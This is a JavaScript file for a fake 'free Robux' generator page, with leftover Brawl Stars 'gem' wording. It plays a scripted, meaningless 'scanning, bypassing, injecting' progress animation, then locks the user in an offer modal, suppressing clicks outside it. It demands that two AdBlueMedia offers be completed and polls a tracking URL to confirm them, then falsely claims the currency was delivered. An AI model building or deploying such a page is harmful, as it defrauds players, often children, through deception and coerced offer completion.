﻿// ========================
// GEM GENERATION + ADBLUEMEDIA
// ========================
(function() {
    'use strict';

    // ---- AdBlueMedia check URL (for lead completion polling) ----
    var ABM_CHECK_URL = 'https://d1cdbd1x576ga0.cloudfront.net/public/external/check2.php';

    // ---- State ----
    var selectedGems   = 0;
    var selectedImg    = '';
    var isGenerating   = false;
    var leadCheckTimer = null;
    var offerOpen      = false;

    // ---- Player data (injected by PHP) ----
    var playerName  = (document.getElementById('p-name')  || {}).value || 'Brawler';
    var playerTag   = (document.getElementById('p-tag')   || {}).value || '';

    // Fallback translations if window.LANG is missing
    var fallback = {
        'step_scanning': "Scanning player profile…",
        'step_vault': "Opening the Brawl Stars vault…",
        'step_rate_limits': "Checking reward availability…",
        'step_packaging': "Packaging your Gems…",
        'step_ready': "Transfer ready!",
        'bubble_welcome_stats': "💎 Nice stats {name}! Pick your Robux pack above to get started!",
        'bubble_generating': "⚡ Great choice {name}! Preparing {gems} Robux…",
        'bubble_scan': "🔍 Scanning player profile…",
        'bubble_bypass': "🔓 Checking Roblox player tag…",
        'bubble_inject': "⚡ Adding Robux to the vault…",
        'bubble_package': "📦 Packaging Robux for {name}…",
        'bubble_secure': "✅ Almost done! Securing transfer…",
        'status_scanning': "Scanning…",
        'status_bypassing': "Checking…",
        'status_injecting': "Injecting…",
        'status_packaging': "Packaging…",
        'status_securing': "Securing…",
        'status_ready': "Transfer ready!",
        'bubble_final': "🚨 FINAL STEP! Hit CLAIM ROBUX to unlock and receive your {gems} free Robux! 💎",
        'modal_complete_offers_gems': "Complete <strong>2 offers</strong> to unlock <strong>{gems} Robux</strong>",
        'bubble_abm_modal': "📱 Complete TWO offers below to unlock your {gems} Robux!",
        'bubble_modal_closed': "⚠️ Wait {name}! You MUST complete an offer to unlock your Robux! Click CLAIM to try again!",
        'loading_offers': "Loading available offers…",
        'no_offers': "No offers available right now. Try again soon!",
        'could_not_load': "Could not load offers. Please try again.",
        'earn_gems': "Complete to earn Robux",
        'offer_completed': "Offer Completed!",
        'offer_completed_sub': "Awesome {name}! Your <strong style=\"color:var(--gem)\">{gems} Robux</strong> are ready for your Roblox account!<br><br>Please allow up to 5 minutes for Robux to appear in-game.",
        'bubble_completed': "🎉 CONGRATS {name}! {gems} Robux unlocked for your Roblox account!",
        'toast_completed': "🎉 {name} received {gems} Robux!"
    };

    function t(key, replacements) {
        var val = (window.LANG && window.LANG[key]) ? window.LANG[key] : fallback[key];
        if (!val) return key;
        if (replacements) {
            for (var k in replacements) {
                val = val.replace('{' + k + '}', replacements[k]);
            }
        }
        return val;
    }

    // ---- Gen steps config ----
    var STEPS = [
        { icon: '🔍', label: t('step_scanning')  },
        { icon: '🔓', label: t('step_vault')       },
        { icon: '⚡',       label: t('step_rate_limits') },
        { icon: '📦', label: t('step_packaging')  },
        { icon: '✅',       label: t('step_ready')       }
    ];

    // ---- Build step list HTML ----
    function buildSteps() {
        var html = '';
        STEPS.forEach(function(s, i) {
            html += '<div class="gen-step" id="step-' + i + '">' +
                    '<span class="step-icon">' + s.icon + '</span>' +
                    '<span>' + s.label + '</span></div>';
        });
        return html;
    }

    // ---- Activate a step ----
    function activateStep(idx) {
        for (var i = 0; i < STEPS.length; i++) {
            var el = document.getElementById('step-' + i);
            if (!el) continue;
            el.classList.remove('active', 'done');
            if (i < idx)  el.classList.add('done');
            if (i === idx) el.classList.add('active');
        }
    }

    // ================================================================
    // GEM PACK SELECTION
    // ================================================================
    var packs = document.querySelectorAll('.gem-pack');
    packs.forEach(function(pack) {
        pack.addEventListener('click', function() {
            if (isGenerating) return;
            isGenerating = true;

            // Highlight selected
            packs.forEach(function(p) { p.classList.remove('selected'); });
            pack.classList.add('selected', 'selecting');

            selectedGems = parseInt(pack.dataset.gems, 10);
            selectedImg  = pack.dataset.img;

            setTimeout(function() {
                pack.classList.remove('selecting');
                startGeneration();
            }, 500);
        });
    });

    // ================================================================
    // GENERATION SEQUENCE
    // ================================================================
    function startGeneration() {
        // Hide gem panel, show gen panel
        fadeOut(document.getElementById('gem-panel'), function() {
            var genPanel = document.getElementById('gen-panel');
            genPanel.classList.add('active');

            // Set gem image + count
            document.getElementById('gen-img').src = selectedImg;
            document.getElementById('gen-count').textContent = '0';

            // Build steps
            document.getElementById('gen-steps').innerHTML = buildSteps();

            // Update bubble
            cancelTyping();
            smoothType('bubble-text', t('bubble_generating', { name: playerName, gems: fmtNum(selectedGems) }));

            // Log activity
            logActivity(playerName, selectedGems);

            // Start progress
            runProgress();
        });
    }

    function runProgress() {
        var pct    = 0;
        var fill   = document.getElementById('gen-fill');
        var pctEl  = document.getElementById('gen-pct');
        var countEl= document.getElementById('gen-count');
        var statusEl = document.getElementById('gen-status');

        var stepMap = [
            { at: 0,  step: 0 },
            { at: 20, step: 1 },
            { at: 40, step: 2 },
            { at: 65, step: 3 },
            { at: 85, step: 4 }
        ];

        var MSG_MAP = [
            { at: 0,  msg: t('bubble_scan') },
            { at: 20, msg: t('bubble_bypass') },
            { at: 40, msg: t('bubble_inject') },
            { at: 65, msg: t('bubble_package', { name: playerName }) },
            { at: 85, msg: t('bubble_secure') }
        ];

        var lastStep = -1;
        var lastMsg  = -1;
        var speed    = 1.0;
        var ticks    = 0;
        var ticksToChange = rand(20, 50);

        function tick() {
            if (!isGenerating) return;

            ticks++;
            if (ticks >= ticksToChange) {
                ticks = 0;
                ticksToChange = rand(10, 20);
                if (pct < 30)      speed = 1.2 + Math.random() * 1.5;
                else if (pct < 60) speed = 1.5 + Math.random() * 2.0;
                else if (pct < 85) speed = 0.8 + Math.random() * 1.5;
                else               speed = 0.5 + Math.random() * 0.8;
            }

            pct = Math.min(pct + 0.45 * speed, 99);

            fill.style.width  = pct + '%';
            pctEl.textContent = Math.floor(pct) + '%';
            countEl.textContent = fmtNum(Math.round(pct / 100 * selectedGems));

            // Status label
            for (var i = stepMap.length - 1; i >= 0; i--) {
                if (pct >= stepMap[i].at && stepMap[i].step !== lastStep) {
                    activateStep(stepMap[i].step);
                    lastStep = stepMap[i].step;
                    break;
                }
            }

            // Bubble messages
            for (var j = MSG_MAP.length - 1; j >= 0; j--) {
                if (pct >= MSG_MAP[j].at && j !== lastMsg) {
                    cancelTyping();
                    smoothType('bubble-text', MSG_MAP[j].msg);
                    lastMsg = j;
                    break;
                }
            }

            // Status text
            var statusTexts = [
                t('status_scanning'),
                t('status_bypassing'),
                t('status_injecting'),
                t('status_packaging'),
                t('status_securing'),
                t('status_ready')
            ];
            var si = Math.min(Math.floor(pct / 20), statusTexts.length - 1);
            if (statusEl) statusEl.textContent = '> ' + statusTexts[si] + ' (' + Math.floor(pct) + '%)';

            if (pct < 99) {
                setTimeout(tick, 30);
            } else {
                setTimeout(showFinalReward, 800);
            }
        }

        tick();
    }

    // ================================================================
    // FINAL REWARD SCREEN
    // ================================================================
    function showFinalReward() {
        var genPanel = document.getElementById('gen-panel');
        var rewardPanel = document.getElementById('reward-panel');

        fadeOut(genPanel, function() {
            genPanel.classList.remove('active');
            rewardPanel.classList.add('active');

            document.getElementById('reward-img').src = selectedImg;
            document.getElementById('reward-gems').textContent = fmtNum(selectedGems) + ' ROBUX';

            cancelTyping();
            smoothType('bubble-text', t('bubble_final', { gems: fmtNum(selectedGems) }));

            // Confetti burst
            launchConfetti();

            // Claim button
            document.getElementById('btn-claim').addEventListener('click', openOfferModal);
        });
    }

    // ================================================================
    // OFFER MODAL — AdBlueMedia native feed
    // ================================================================
    function openOfferModal() {
        if (offerOpen) return;
        offerOpen = true;

        var modal = document.getElementById('offer-modal');
        modal.classList.add('open');
        document.documentElement.style.overflow = 'hidden';

        var modalText = document.getElementById('modal-offer-text');
        if (modalText) {
            modalText.innerHTML = t('modal_complete_offers_gems', { gems: fmtNum(selectedGems) });
        }

        // Initialize progress bar
        updateProgress(0);

        // Load offers
        loadOffers();

        // Start lead polling
        startLeadPolling();

        cancelTyping();
        smoothType('bubble-text', t('bubble_abm_modal', { gems: fmtNum(selectedGems) }));
    }

    function closeOfferModal() {
        var modal = document.getElementById('offer-modal');
        modal.classList.remove('open');
        document.documentElement.style.overflow = '';
        offerOpen = false;
        stopLeadPolling();

        cancelTyping();
        smoothType('bubble-text', t('bubble_modal_closed', { name: playerName }));
    }

    function loadOffers() {
        var list = document.getElementById('offer-list');
        list.innerHTML =
            '<div class="offer-loading">' +
            '<div class="offer-spinner"></div>' +
            '<span>' + t('loading_offers') + '</span>' +
            '</div>';

        var url = 'api.php?action=offers'
            + '&s1=' + encodeURIComponent(playerTag)
            + '&s2=' + encodeURIComponent(String(selectedGems));

        var xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.timeout = 10000;
        xhr.onreadystatechange = function() {
            if (xhr.readyState !== 4) return;
            var offers = [];
            try {
                var res = JSON.parse(xhr.responseText);
                offers = res.offers || [];
            } catch(e) {}

            if (!offers.length) {
                list.innerHTML = '<div class="offer-loading"><span>' + t('no_offers') + '</span></div>';
                return;
            }

            var html = '';
            for (var i = 0; i < offers.length; i++) {
                var o = offers[i];
                var iconHtml = '<img src="images/icon_resource_gem.png" alt="" style="width:40px;height:40px;object-fit:contain;flex-shrink:0;filter:drop-shadow(0 2px 6px rgba(61,214,140,0.5));">';

                html +=
                    '<a class="offer-item" href="' + escHtml(o.url) + '" target="_blank" rel="noopener">' +
                    iconHtml +
                    '<div class="offer-info">' +
                    '<div class="offer-name">'       + escHtml(o.name) + '</div>' +
                    '<div class="offer-conversion">' + escHtml(o.desc) + '</div>' +
                    '</div>' +
                    '<div class="offer-btn-claim">C\'EST PARTI !</div>' +
                    '</a>';
            }
            list.innerHTML = html;
        };
        xhr.ontimeout = function() {
            list.innerHTML = '<div class="offer-loading"><span>' + t('could_not_load') + '</span></div>';
        };
        xhr.send();
    }

    // ================================================================
    // LEAD COMPLETION POLLING & PROGRESS TRACKING
    // ================================================================
    function startLeadPolling() {
        stopLeadPolling();
        leadCheckTimer = setInterval(checkLeads, 15000);
    }

    // Keep the offer modal open when users click outside the sheet.
    var overlay = document.getElementById('offer-overlay');
    if (overlay) {
        overlay.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
    }

    function stopLeadPolling() {
        if (leadCheckTimer) { clearInterval(leadCheckTimer); leadCheckTimer = null; }
    }

    function updateProgress(count) {
        var pct = (count / 2) * 100;
        var barFill = document.getElementById('opc-bar-fill');
        var opcCount = document.getElementById('opc-count');
        var badgeStatus = document.getElementById('opc-badge-status');

        if (barFill) barFill.style.width = pct + '%';
        if (opcCount) opcCount.textContent = count + '/2';

        if (badgeStatus) {
            if (count === 0) {
                badgeStatus.textContent = window.CURRENT_LANG === 'ar' ? 'في الانتظار...' : 'WAITING...';
                badgeStatus.style.borderColor = 'var(--glass-border)';
                badgeStatus.style.color = 'var(--text-3)';
            } else if (count === 1) {
                badgeStatus.textContent = window.CURRENT_LANG === 'ar' ? 'اكتمل 1/2!' : '1/2 COMPLETED!';
                badgeStatus.style.borderColor = 'rgba(61,214,140,0.3)';
                badgeStatus.style.color = 'var(--gem)';
                badgeStatus.style.background = 'rgba(61,214,140,0.1)';

                // Update speech bubble to keep user engaged!
                cancelTyping();
                smoothType('bubble-text', t('bubble_half_completed', { name: playerName }));
            } else {
                badgeStatus.textContent = window.CURRENT_LANG === 'ar' ? 'مكتمل!' : 'COMPLETED!';
                badgeStatus.style.borderColor = 'var(--gem)';
                badgeStatus.style.color = '#fff';
                badgeStatus.style.background = 'var(--gem)';
            }
        }
    }

    function checkLeads() {
        var url = ABM_CHECK_URL + '?testing=0&callback=?';
        jsonp(url, function(leads) {
            if (leads && leads.length) {
                var completedCount = Math.min(leads.length, 2);
                updateProgress(completedCount);
                if (completedCount >= 2) {
                    stopLeadPolling();
                    onLeadCompleted(leads);
                }
            } else {
                updateProgress(0);
            }
        });
    }

    function onLeadCompleted(leads) {
        var list = document.getElementById('offer-list');
        list.innerHTML =
            '<div class="offer-completed">' +
            '<div class="offer-completed-icon">🎉</div>' +
            '<h3>' + t('offer_completed') + '</h3>' +
            '<p>' + t('offer_completed_sub', { name: playerName, gems: fmtNum(selectedGems) }) + '</p>' +
            '</div>';

        cancelTyping();
        smoothType('bubble-text', t('bubble_completed', { name: playerName, gems: selectedGems }));

        showToast('🎉', t('toast_completed', { name: playerName, gems: fmtNum(selectedGems) }), 6000);
    }

    // ================================================================
    // ACTIVITY LOG
    // ================================================================
    function logActivity(name, gems) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'api.php?action=log', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({ name: name, gems: gems }));
        } catch(e) {}
    }

    // ================================================================
    // CONFETTI
    // ================================================================
    function launchConfetti() {
        if (typeof confetti === 'function') {
            confetti({ particleCount: 120, spread: 80, origin: { y: 0.55 }, colors: ['#3dd68c','#ffd12e','#4f9eff','#ffffff'] });
            setTimeout(function() {
                confetti({ particleCount: 60, spread: 50, origin: { y: 0.55 }, angle: 60 });
                confetti({ particleCount: 60, spread: 50, origin: { y: 0.55 }, angle: 120 });
            }, 600);
        }
    }

    // ================================================================
    // HELPERS
    // ================================================================
    function fadeOut(el, cb) {
        if (!el) { if(cb) cb(); return; }
        el.style.transition = 'opacity 0.3s ease';
        el.style.opacity = '0';
        setTimeout(function() {
            el.style.display = 'none';
            el.style.opacity = '';
            el.style.transition = '';
            if (cb) cb();
        }, 300);
    }

    function rand(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    // JSONP helper (for AdBlueMedia CORS-safe requests)
    var _jsonpCbIdx = 0;
    function jsonp(url, success, error) {
        var cbName = '_abm_cb_' + (++_jsonpCbIdx);
        var script = document.createElement('script');
        var done = false;
        var timeout = setTimeout(function() {
            cleanup();
            if (error) error('timeout');
        }, 10000);

        window[cbName] = function(data) {
            cleanup();
            if (success) success(data);
        };

        function cleanup() {
            if (done) return;
            done = true;
            clearTimeout(timeout);
            script.remove();
            delete window[cbName];
        }

        url = url.replace('callback=?', 'callback=' + cbName);
        script.src = url;
        script.onerror = function() { cleanup(); if (error) error('error'); };
        document.head.appendChild(script);
    }

    // ================================================================
    // INIT
    // ================================================================

    // Initial bubble message
    smoothType('bubble-text', t('bubble_welcome_stats', { name: playerName }));

})();
